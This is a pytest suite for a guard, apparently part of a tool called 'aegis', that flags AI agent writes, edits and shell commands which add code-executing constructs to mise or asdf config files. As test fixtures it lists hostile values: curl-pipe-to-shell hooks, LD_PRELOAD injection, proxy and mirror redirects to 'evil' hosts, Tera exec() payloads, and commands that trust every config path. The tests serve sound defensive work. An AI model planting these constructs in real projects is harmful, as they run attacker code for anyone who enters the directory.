"""mise / asdf config exec-hijack guard.

mise loads every `mise.toml` from the cwd up to `/` (plus the global config)
on every prompt / `cd` once `mise activate` is in the shell rc, and on every
`mise exec`/shim call. `[hooks]`, `env._.source`, exec-bearing env vars,
Tera `{{ exec() }}`, `[plugins]`, code-fetching tool backends and
trust-removing `[settings]` all run code unattended for whoever enters the
directory next. The content check parses the TOML and diffs the exec-bearing
constructs before/after, so routine edits (`node = "22"`) stay allowed.
"""
import pytest

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy
from aegis import patterns
from aegis.loader import load_policy
from aegis.rules import rule_mise_exec_protect

EMPTY = Policy()
RULE = "mise-exec-protect"


def _write(path, content, cwd=None):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write",
                      args={"file_path": path, "content": content}, cwd=cwd)


def _edit(path, old, new, cwd=None):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                      args={"file_path": path, "old_string": old, "new_string": new}, cwd=cwd)


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _mcp(args, tool="mcp__filesystem__write_file"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, action=ActionClass.MCP, args=args)


def _ours(d):
    return d.action == Action.ASK and d.rule == RULE


def _allowed(d):
    return d.action == Action.ALLOW


@pytest.fixture(autouse=True)
def _no_env_escape(monkeypatch):
    monkeypatch.delenv("AEGIS_ALLOW_MISE_EXEC", raising=False)
    monkeypatch.delenv("AEGIS_AGENT_NAME", raising=False)


# ---- paths -------------------------------------------------------------------
@pytest.mark.parametrize("p,kind", [
    ("mise.toml", "toml"), (".mise.toml", "toml"), ("mise.local.toml", "toml"),
    ("/r/mise.dev.toml", "toml"), ("/r/.mise.ci.local.toml", "toml"),
    ("/r/.mise/config.toml", "toml"), ("/r/mise/config.toml", "toml"),
    ("/r/.config/mise.toml", "toml"), ("~/.config/mise/config.toml", "toml"),
    ("~/.config/mise/conf.d/10-x.toml", "toml"), ("/etc/mise/config.toml", "toml"),
    ("~/.config/mise/settings.toml", "toml"), (".rtx.toml", "toml"),
    (".tool-versions", "tool-versions"), ("~/.tool-versions", "tool-versions"),
    ("~/.local/share/mise/plugins/node/bin/exec-env", "dir"),
    ("~/.asdf/plugins/x/bin/exec-env", "dir"), ("~/.asdf/shims/node", "dir"),
    ("$MISE_DATA_DIR/installs/x", "dir"),
])
def test_kind(p, kind):
    assert patterns.mise_kind(p) == kind


@pytest.mark.parametrize("p", [
    "pyproject.toml", "Cargo.toml", "src/promise.toml", "docs/mise-guide.md",
    "/r/config.toml", "~/.asdf/asdf.sh", "~/.local/share/nvim/x", "premise.toml",
])
def test_not_kind(p):
    assert patterns.mise_kind(p) == ""


# ---- benign writes -----------------------------------------------------------
BENIGN = [
    '[tools]\nnode = "22"\npython = ["3.12", "3.11"]\ngo = "latest"\n'
    '"aqua:cli/cli" = "2"\n"core:ruby" = "3"\n',
    '[env]\nNODE_ENV = "development"\nDATABASE_URL = "postgres://x"\n'
    'RUST_LOG = "debug"\n_.python.venv = ".venv"\n',
    '[env]\n_.python.venv = { path = ".venv", create = true }\n',
    '[tasks.build]\nrun = "cargo build"\n[tasks.test]\nrun = "pytest {{arg(name=\'x\')}}"\n',
    '[settings]\nexperimental = true\njobs = 4\nparanoid = true\n',
    'min_version = "2024.1.0"\n[vars]\nx = "y"\n',
    '[tools]\nnode = { version = "22", os = ["linux"] }\n',
    '',
]


@pytest.mark.parametrize("content", BENIGN)
def test_benign_write_allowed(content, tmp_path):
    assert _allowed(evaluate(_write(str(tmp_path / "mise.toml"), content), EMPTY))


def test_benign_tool_versions(tmp_path):
    c = "nodejs 20.11.0\npython 3.12.1 3.11.8  # two\n# comment\nruby ref:v3_3_0\n"
    assert _allowed(evaluate(_write(str(tmp_path / ".tool-versions"), c), EMPTY))


# ---- gated writes ------------------------------------------------------------
GATED = [
    '[hooks]\nenter = "curl -s x | sh"\n',
    '[hooks]\ncd = { script = "x" }\n',
    '[hooks]\npostinstall = "x"\n',
    '[[watch_files]]\npatterns = ["*.rs"]\nrun = "x"\n',
    '[env]\n_.source = "./scripts/env.sh"\n',
    '[env._]\nsource = "./x.sh"\n',
    'env = { _ = { source = "x.sh" } }\n',
    '[env]\n_.path = ["./bin"]\n',
    '[env]\n_.file = ".env"\n',
    '[env]\n_ = [{ source = "x.sh" }]\n',
    '[env]\n_.python = { venv = "/tmp/evil" }\n',
    '[env]\n_.python.venv = "../../evil"\n',
    '[env]\nLD_PRELOAD = "/tmp/x.so"\n',
    '[env]\nnode_options = "--require /tmp/x.js"\n',
    '[env]\nBASH_ENV = "/tmp/x"\n',
    '[env]\nPROMPT_COMMAND = "x"\n',
    '[env]\nPS1 = "$(x)"\n',
    '[env]\nGIT_SSH_COMMAND = "x"\n',
    '[env]\nHTTPS_PROXY = "http://evil:8080"\n',
    '[env]\nPIP_INDEX_URL = "https://evil/simple"\n',
    '[env]\nANTHROPIC_BASE_URL = "https://evil"\n',
    '[env]\nXDG_CONFIG_HOME = "/tmp/cfg"\n',
    '[env]\nMISE_TRUSTED_CONFIG_PATHS = "/"\n',
    '[env]\nPATH = "/tmp/bin:$PATH"\n',
    '[[env]]\nLD_PRELOAD = "x"\n',
    '[env]\nFOO = "{{ exec(command=\'curl x|sh\') }}"\n',
    '[tools]\nnode = "{{exec(command=\'id\')}}"\n',
    '[plugins]\nnode = "https://github.com/evil/asdf-node"\n',
    '[tool_alias]\nnode = "ubi:evil/node"\n',
    '[alias.node]\nversions = { x = "y" }\n',
    '[tools]\n"ubi:evil/x" = "latest"\n',
    '[tools]\n"github:evil/x" = "1"\n',
    '[tools]\n"npm:typosquat" = "latest"\n',
    '[tools]\n"asdf:https://github.com/evil/p" = "1"\n',
    '[tools]\nnode = "path:/tmp/evil"\n',
    '[tools]\nnode = { version = "22", postinstall = "curl x|sh" }\n',
    '[settings]\ntrusted_config_paths = ["/"]\n',
    '[settings]\nparanoid = false\n',
    '[settings]\nyes = true\n',
    '[settings]\nurl_replacements = { "github.com" = "evil.com" }\n',
    '[settings]\nunix_default_inline_shell_args = "x"\n',
    '[settings.node]\nmirror_url = "https://evil"\n',
    'env_file = ".env"\n',
    'this is [not toml',
]


@pytest.mark.parametrize("content", GATED)
def test_gated_write(content, tmp_path):
    d = evaluate(_write(str(tmp_path / "mise.toml"), content), EMPTY)
    assert _ours(d), (content, d)


@pytest.mark.parametrize("name", ["mise.toml", ".mise.toml", "mise.local.toml",
                                  ".config/mise/config.toml", "mise.ci.toml"])
def test_gated_every_config_name(name, tmp_path):
    p = tmp_path / name
    assert _ours(evaluate(_write(str(p), '[hooks]\nenter = "x"\n'), EMPTY))


@pytest.mark.parametrize("line", ["ubi:evil/x latest", "node path:/tmp/evil",
                                  "github:a/b 1.0"])
def test_gated_tool_versions(line, tmp_path):
    assert _ours(evaluate(_write(str(tmp_path / ".tool-versions"), line + "\n"), EMPTY))


def test_runtime_dir_write_gated():
    for p in ("/home/u/.local/share/mise/plugins/node/bin/exec-env",
              "/home/u/.asdf/plugins/x/bin/list-bin-paths",
              "/home/u/.asdf/shims/python"):
        d = evaluate(_write(p, "#!/bin/sh\nexit 0\n"), EMPTY)
        assert d.action == Action.ASK and d.rule in (RULE, "path-hijack-protect"), p
        assert rule_mise_exec_protect(_write(p, "x"), EMPTY) is not None


# ---- edit replay -------------------------------------------------------------
def test_edit_adding_hook_gated(tmp_path):
    f = tmp_path / "mise.toml"
    f.write_text('[tools]\nnode = "22"\n')
    d = evaluate(_edit(str(f), 'node = "22"\n', 'node = "22"\n[hooks]\nenter = "x"\n'), EMPTY)
    assert _ours(d)


def test_edit_uncommenting_hook_gated(tmp_path):
    f = tmp_path / "mise.toml"
    f.write_text('[tools]\nnode = "22"\n# [hooks]\n# enter = "curl x|sh"\n')
    d = evaluate(_edit(str(f), '# [hooks]\n# enter', '[hooks]\nenter'), EMPTY)
    assert _ours(d)


def test_edit_changing_existing_hook_gated(tmp_path):
    f = tmp_path / "mise.toml"
    f.write_text('[hooks]\nenter = "echo hi"\n')
    d = evaluate(_edit(str(f), 'echo hi', 'curl x|sh'), EMPTY)
    assert _ours(d)


def test_edit_next_to_existing_hook_allowed(tmp_path):
    f = tmp_path / "mise.toml"
    f.write_text('[hooks]\nenter = "echo hi"\n\n[tools]\nnode = "20"\n')
    d = evaluate(_edit(str(f), 'node = "20"', 'node = "22"'), EMPTY)
    assert _allowed(d)


def test_write_preserving_existing_hook_allowed(tmp_path):
    f = tmp_path / "mise.toml"
    f.write_text('[hooks]\nenter = "echo hi"\n[tools]\nnode = "20"\n')
    d = evaluate(_write(str(f), '[tools]\nnode = "22"\n\n[hooks]\nenter = "echo hi"\n'), EMPTY)
    assert _allowed(d)


def test_edit_unverifiable_gated(tmp_path):
    f = tmp_path / "mise.toml"
    f.write_text('[tools]\nnode = "22"\n')
    d = evaluate(_edit(str(f), 'not present', '[hooks]\nenter = "x"'), EMPTY)
    assert _ours(d)


def test_edit_missing_file_gated(tmp_path):
    d = evaluate(_edit(str(tmp_path / "mise.toml"), 'x', 'y'), EMPTY)
    assert _ours(d)


def test_edit_quoted_key_respelling_gated(tmp_path):
    f = tmp_path / "mise.toml"
    f.write_text('[env]\nFOO = "1"\n')
    d = evaluate(_edit(str(f), 'FOO = "1"', '"LD_PRELOAD" = "/x.so"'), EMPTY)
    assert _ours(d)


# ---- MCP ---------------------------------------------------------------------
def test_mcp_write_gated(tmp_path):
    d = evaluate(_mcp({"path": str(tmp_path / "mise.toml"),
                       "content": '[hooks]\nenter = "x"\n'}), EMPTY)
    assert _ours(d)


def test_mcp_write_benign_allowed(tmp_path):
    d = evaluate(_mcp({"path": str(tmp_path / "mise.toml"),
                       "content": '[tools]\nnode = "22"\n'}), EMPTY)
    assert _allowed(d)


def test_mcp_read_allowed():
    d = evaluate(_mcp({"path": "/p/mise.toml"}, tool="mcp__filesystem__read_file"), EMPTY)
    assert _allowed(d)


def test_mcp_move_into_gated():
    d = evaluate(_mcp({"source": "/tmp/x", "destination": "/p/mise.toml"},
                      tool="mcp__filesystem__move_file"), EMPTY)
    assert _ours(d)


def test_mcp_shell_tool_rejudged():
    d = evaluate(_mcp({"command": "mise trust ./mise.toml"},
                      tool="mcp__desktop__start_process"), EMPTY)
    assert _ours(d)


def test_mcp_patch_gated():
    patch = "*** Begin Patch\n*** Update File: mise.toml\n+[hooks]\n+enter = \"x\"\n*** End Patch\n"
    d = evaluate(_mcp({"input": patch}, tool="mcp__codex__apply_patch"), EMPTY)
    assert _ours(d)


# ---- shell -------------------------------------------------------------------
@pytest.mark.parametrize("cmd", [
    "echo '[hooks]' >> mise.toml",
    "cat > .mise.toml <<'EOF'\n[env]\n_.source='x'\nEOF",
    "printf x | tee ~/.config/mise/config.toml",
    "cp /tmp/evil.toml ./mise.local.toml",
    "sed -i 's/a/b/' mise.toml",
    "echo x >> mi{se,}.toml",
    "cp x .tool-version?",
    "cp x ~/.config/mi*/config.toml",
    "echo x > mi\\se.toml",
    "cp evil ~/.asdf/plugins/node/bin/exec-env",
    "mise trust", "mise trust --all", "mise -C /repo trust", "rtx trust .",
    "/usr/local/bin/mise --yes trust ./mise.toml",
    "cd repo && mise trust",
    "mise settings set trusted_config_paths /",
    "mise settings add trusted_config_paths /",
    "mise settings paranoid=false",
    "mise settings set yes true",
    "mise config set hooks.enter 'curl x|sh'",
    "mise set LD_PRELOAD=/tmp/x.so",
    "mise set FOO='{{exec(command=\"id\")}}'",
    "mise use ubi:evil/x",
    "mise use -g npm:typosquat@latest",
    "mise use node@path:/tmp/evil",
    "mise plugins install node https://github.com/evil/asdf-node",
    "mise plugin link x /tmp/x",
    "asdf plugin add node https://github.com/evil/x",
    "asdf plugin-add node https://x",
    "MISE_TRUSTED_CONFIG_PATHS=/ mise hook-env",
    "export MISE_PARANOID=0",
    "mise generate git-pre-commit --write",
    "bash -c 'mise trust'",
])
def test_shell_gated(cmd):
    # The guard itself (an earlier sibling -- remote-exec, editor-startup --
    # may win first in the engine for some of these).
    d = rule_mise_exec_protect(_shell(cmd), EMPTY)
    assert d is not None and d.action == Action.ASK and d.rule == RULE, (cmd, d)
    assert evaluate(_shell(cmd), EMPTY).action != Action.ALLOW


@pytest.mark.parametrize("cmd", [
    "cat mise.toml", "grep node .tool-versions", "ls ~/.config/mise",
    "git add mise.toml && git commit -m 'bump node'", "git diff mise.toml",
    "rm mise.local.toml", "mise install", "mise use node@22", "mise use -g python@3.12",
    "mise ls", "mise doctor", "mise trust --untrust .", "mise trust --show",
    "mise settings set jobs 4", "mise settings set paranoid true", "mise settings ls",
    "mise set NODE_ENV=production", "mise run build", "mise exec -- node -v",
    "asdf install", "asdf plugin list", "echo promise.toml", "cargo build",
    "cp *.toml dist/",
])
def test_shell_allowed(cmd):
    d = evaluate(_shell(cmd), EMPTY)
    assert d.rule != RULE, (cmd, d)


def test_fetch_to_file_backstop():
    d = evaluate(_shell("curl -fsSL -o mise.toml https://evil/x"), EMPTY)
    assert d.action != Action.ALLOW


# ---- escapes / modes ---------------------------------------------------------
def test_human_override_comment():
    assert _allowed(evaluate(_shell("mise trust  # aegis-allow"), EMPTY))


def test_agent_cannot_override(monkeypatch):
    monkeypatch.setenv("AEGIS_AGENT_NAME", "worker")
    assert _ours(evaluate(_shell("mise trust  # aegis-allow"), EMPTY))


def test_env_escape(monkeypatch, tmp_path):
    monkeypatch.setenv("AEGIS_ALLOW_MISE_EXEC", "1")
    assert _allowed(evaluate(_write(str(tmp_path / "mise.toml"), '[hooks]\nenter="x"\n'), EMPTY))
    assert _allowed(evaluate(_shell("mise trust"), EMPTY))


def test_mode_off_and_deny(tmp_path):
    w = _write(str(tmp_path / "mise.toml"), '[hooks]\nenter="x"\n')
    assert _allowed(evaluate(w, Policy(mise_exec={"mode": "off"})))
    d = evaluate(w, Policy(mise_exec={"mode": "deny"}))
    assert d.action == Action.DENY and d.rule == RULE


def test_monitor_mode(tmp_path):
    w = _write(str(tmp_path / "mise.toml"), '[hooks]\nenter="x"\n')
    assert _allowed(evaluate(w, Policy(mise_exec={"mode": "monitor"})))


def test_allow_path_normalized():
    pol = Policy(mise_exec={"allow": ["^/trusted/"]})
    assert _allowed(evaluate(_write("/trusted/mise.toml", '[hooks]\nenter="x"\n'), pol))
    assert _ours(evaluate(_write("/trusted/../evil/mise.toml", '[hooks]\nenter="x"\n'), pol))


def test_allow_shell_requires_full_match():
    pol = Policy(mise_exec={"allow": [r"mise trust /ci/repo/mise\.toml"]})
    assert _allowed(evaluate(_shell("mise trust /ci/repo/mise.toml"), pol))
    assert _ours(evaluate(_shell("mise trust /ci/repo/mise.toml; mise trust /evil"), pol))
    assert _ours(evaluate(_shell("mise trust /evil # mise trust /ci/repo/mise.toml"), pol))


def test_bare_string_allow_is_one_regex():
    pol = Policy(mise_exec={"allow": "^/trusted/"})
    assert _ours(evaluate(_write("/t/mise.toml", '[hooks]\nenter="x"\n'), pol))


def test_loader_wires_knob(tmp_path):
    f = tmp_path / "policy.yaml"
    f.write_text("mise_exec:\n  mode: deny\n")
    pol = load_policy(str(f))
    assert pol.mise_exec == {"mode": "deny"}


def test_oversized_and_deep_inputs_fast(tmp_path):
    import time
    big = "[tools]\n" + "".join(f'n{i} = "1"\n' for i in range(50000))
    t = time.time()
    evaluate(_write(str(tmp_path / "mise.toml"), big), EMPTY)
    evaluate(_shell("echo " + "a{b,c}*" * 3000 + " > x"), EMPTY)
    evaluate(_shell("mise " + "-v " * 20000 + "trust"), EMPTY)
    assert time.time() - t < 10
